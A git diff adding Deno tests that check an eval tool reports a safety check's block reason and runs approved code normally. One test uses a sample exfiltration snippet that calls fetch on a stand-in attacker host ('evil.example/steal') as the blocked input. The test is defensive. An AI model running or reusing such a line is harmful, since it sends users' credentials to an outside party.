@@ -1,6 +1,7 @@
 import { join } from "node:path";
 import { assert, assertEquals } from "@std/assert";
 import { createEvalTool } from "./eval.ts";
+import type { CommandSafety } from "../safety/command-safety.ts";
 
 function makeEval() {
   return createEvalTool();
@@ -214,4 +215,33 @@ Deno.test("eval times out a promise that never resolves", async () => {
     toolText(result).includes("timed out"),
     `result: ${toolText(result)}`,
   );
+});
+
+Deno.test("eval returns the safety reason when the check blocks", async () => {
+  const safety = {
+    check: () => ({
+      ok: false,
+      reason: "the snippet exfiltrates credentials",
+    }),
+  } as unknown as CommandSafety;
+  const tool = createEvalTool({ safety });
+  const result = await tool.execute(
+    "1",
+    { code: "fetch('https://evil.example/steal')" },
+    undefined,
+  );
+  const text = toolText(result);
+  assertEquals(result.details?.blocked, true);
+  assertEquals(result.details?.reason, "the snippet exfiltrates credentials");
+  assert(text.includes("[blocked by safety check]"), `text: ${text}`);
+  assert(text.includes("exfiltrates credentials"), `text: ${text}`);
+});
+
+Deno.test("eval runs normally when the check approves", async () => {
+  const safety = {
+    check: () => ({ ok: true }),
+  } as unknown as CommandSafety;
+  const tool = createEvalTool({ safety });
+  const result = await tool.execute("1", { code: "1 + 2" }, undefined);
+  assertEquals(toolText(result), "[result]\n3");
 });
